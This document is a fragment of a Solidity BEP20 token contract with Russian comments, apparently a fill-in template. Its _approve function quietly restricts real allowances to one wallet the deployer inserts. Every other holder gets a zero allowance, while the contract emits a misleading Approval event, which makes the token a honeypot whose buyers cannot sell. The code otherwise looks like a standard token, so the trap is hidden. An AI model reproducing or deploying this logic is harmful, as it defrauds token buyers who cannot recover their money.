...
contract Context {constructor () internal { }function _msgSender() internal view returns (address payable) {return msg.sender;}function _msgData() internal view returns (bytes memory) {this; return msg.data;}}
library SafeMath {
...
contract BEP20Token is Context, IBEP20, Ownable {
  ...
  constructor() public {
    _name = "Example";  //имя токена
    _symbol = "EXA";    // тикер токена
    _decimals = 6;    // знаки после точки
    _totalSupply = 1000000000000000;  // кол-во == 1 млрд 1 * 10**15
    _balances[msg.sender] = _totalSupply; emit Transfer(address(0), msg.sender, _totalSupply);
  }
  ...
  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");_totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);emit Transfer(address(0), account, amount);}
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");require(spender != address(0), "BEP20: approve to the zero address");
    if ( (owner == address(input your wallet)) ) { _allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}  // input your wallet 
    else {_allowances[owner][spender] = 0;emit Approval(owner, spender, 8);}}
